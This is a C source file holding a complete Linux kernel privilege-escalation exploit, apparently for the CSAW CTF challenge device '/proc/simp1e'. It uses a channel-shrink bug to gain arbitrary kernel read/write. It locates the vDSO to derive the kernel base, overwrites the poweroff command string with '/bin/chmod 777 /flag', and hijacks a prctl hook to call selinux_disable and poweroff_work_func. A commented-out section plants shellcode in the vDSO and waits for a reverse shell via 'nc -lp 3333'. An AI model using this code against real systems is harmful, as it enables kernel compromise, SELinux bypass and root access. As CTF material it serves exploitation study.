#include <stdio.h>
#include <sys/prctl.h>       
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/auxv.h> 



#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8


struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

void print_hex(char *buf,size_t len){
	int i ;
	for(i = 0;i<((len/8)*8);i+=8){
		printf("0x%lx",*(size_t *)(buf+i) );
		if (i%16)
			printf(" ");
		else
			printf("\n");
	}
}

void show_vdso_userspace(int len){
	size_t addr=0;
	addr = getauxval(AT_SYSINFO_EHDR);
	if(addr<0){
		puts("[-]cannot get vdso addr");
		return ;
	}
	for(int i = len;i<0x1000;i++){
		printf("%x ",*(char *)(addr+i));
	}
}
int check_vsdo_shellcode(char *shellcode){
	size_t addr=0;
	addr = getauxval(AT_SYSINFO_EHDR);
	printf("vdso:%lx\n", addr);
	if(addr<0){
		puts("[-]cannot get vdso addr");
		return 0;
	}	
	if (memmem((char *)addr,0x1000,shellcode,strlen(shellcode) )){
		return 1;
	}
	return 0;
}

int main(){
	int fd = -1;
	size_t result = 0;
	struct alloc_channel_args alloc_args;
	struct shrink_channel_args shrink_args;
	struct seek_channel_args seek_args;
	struct read_channel_args read_args;
	struct close_channel_args close_args;
	struct write_channel_args write_args;
	size_t addr = 0xffffffff80000000;
	size_t real_cred = 0;
	size_t cred = 0;
	size_t target_addr ;
	size_t kernel_base = 0 ;
	size_t selinux_disable_addr= 0x2C7BA0;
	size_t prctl_hook = 0x124FD00;
	size_t order_cmd = 0x123D1E0;
	size_t poweroff_work_func_addr =0x9C4C0;
	int root_cred[12];
	setvbuf(stdout, 0LL, 2, 0LL);
	char *buf = malloc(0x1000);
	char target[16];
	strcpy(target,"try2findmep4nda");

	fd = open("/proc/simp1e",O_RDWR);
	if(fd < 0){
		puts("[-] open error");
		exit(-1);
	}

	alloc_args.buf_size = 0x100;
	alloc_args.id = -1;
	ioctl(fd,CSAW_ALLOC_CHANNEL,&alloc_args);
	if (alloc_args.id == -1){
		puts("[-] alloc_channel error");
		exit(-1);
	}
	printf("[+] now we get a channel %d\n",alloc_args.id);
	shrink_args.id = alloc_args.id;
	shrink_args.size = 0x100+1;
	ioctl(fd,CSAW_SHRINK_CHANNEL,&shrink_args);
	puts("[+] we can read and write any momery");
	for(;addr<0xffffffffffffefff;addr+=0x1000){
		seek_args.id =  alloc_args.id;
		seek_args.index = addr-0x10 ;
		seek_args.whence= SEEK_SET;
		ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
		read_args.id = alloc_args.id;
		read_args.buf = buf;
		read_args.count = 0x1000;
		ioctl(fd,CSAW_READ_CHANNEL,&read_args);
		if(( !strcmp("gettimeofday",buf+0x2cd)) ){ // ((*(size_t *)(buf) == 0x00010102464c457f)) && 
			result = addr;
			printf("[+] found vdso %lx\n",result);
			break;
		}
	}
	//scanf("%d",&cred);
	//printf("");
	if(result == 0){
		puts("not found , try again ");
		exit(-1);
	}
	kernel_base = addr-0x1020000;
	selinux_disable_addr+= kernel_base;
	prctl_hook += kernel_base;
	order_cmd += kernel_base;
	poweroff_work_func_addr += kernel_base;
	//size_t argv_0 = kernel_base + 0x117ed20;
	//size_t mce_do_trigger_addr = kernel_base + 0x0422ba;
	//size_t env = kernel_base + 0xe4df20;
	printf("[+] found kernel base: %lx\n",kernel_base);
	printf("[+] found prctl_hook: %lx\n",prctl_hook);
	printf("[+] found order_cmd : %lx\n",order_cmd);
	printf("[+] found selinux_disable_addr : %lx\n",selinux_disable_addr);	
	printf("[+] found poweroff_work_func_addr: %lx\n",poweroff_work_func_addr);

	getchar();
// change *prctl_hook -> selinux_disable_addr	
	memset(buf,'\0',0x1000);
	//*(size_t *)buf = selinux_disable_addr;
	strcpy(buf,"/bin/chmod 777 /flag\0");
	seek_args.id =  alloc_args.id;
	seek_args.index = order_cmd-0x10 ;
	seek_args.whence= SEEK_SET;	
	ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
	write_args.id = alloc_args.id;
	write_args.buf = buf;//&cat_flag;
	write_args.count = strlen(buf);
	ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);
	memset(buf,'\0',0x1000);
	seek_args.id =  alloc_args.id;
	seek_args.index = order_cmd+20-0x10 ;
	seek_args.whence= SEEK_SET;	
	ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
	write_args.id = alloc_args.id;
	write_args.buf = buf;//&cat_flag;
	write_args.count = 1;
	ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);
//  change hook -> selinux_disable
	memset(buf,'\0',0x1000);
	*(size_t *)buf = selinux_disable_addr;
	//strcpy(buf,"/bin//sh\0");
	seek_args.id =  alloc_args.id;
	seek_args.index = prctl_hook-0x10 ;
	seek_args.whence= SEEK_SET;	
	ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
	write_args.id = alloc_args.id;
	write_args.buf = buf;//&cat_flag;
	write_args.count = strlen(buf)+1;
	ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);	
	//prctl(addr,2, addr,addr,2);
//  change hook -> selinux_disable
	memset(buf,'\0',0x1000);
	*(size_t *)buf = poweroff_work_func_addr;
	seek_args.id =  alloc_args.id;
	seek_args.index = prctl_hook-0x10 ;
	seek_args.whence= SEEK_SET;	
	ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
	write_args.id = alloc_args.id;
	write_args.buf = buf;//&cat_flag;
	write_args.count = strlen(buf)+1;
	ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);	

// change order_cmd -> "cat /flag\0"
	prctl(addr,2, addr,addr,2);

/*	
	ioctl(fd,CSAW_CLOSE_CHANNEL,&close_args);
	seek_args.id =  alloc_args.id;
	seek_args.index = result-0x10+0xc80 ;
	seek_args.whence= SEEK_SET;
	ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
	write_args.id = alloc_args.id;
	write_args.buf = shellcode;
	write_args.count = strlen(shellcode);
	ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);
	if(check_vsdo_shellcode(shellcode)!=0){
		puts("[+] shellcode is written into vdso, waiting for a reverse shell :");
		//system("nc -l -p 3333");
		if(fork() == 0){
				printf("gettimeofday\n");
				sleep(1);
				//gettimeofday();
				void (*gettimeofday_addr)();
				gettimeofday_addr = 0xc80 + getauxval(AT_SYSINFO_EHDR);
				gettimeofday_addr();
				exit(-1);
			}
		system("nc -lp 3333");
	}
	else{
		puts("[-] someting wrong ... ");
		exit(-1);
	}
	//show_vdso_userspace(0xc30);
	ioctl(fd,CSAW_CLOSE_CHANNEL,&close_args);
*/

	return 0;
}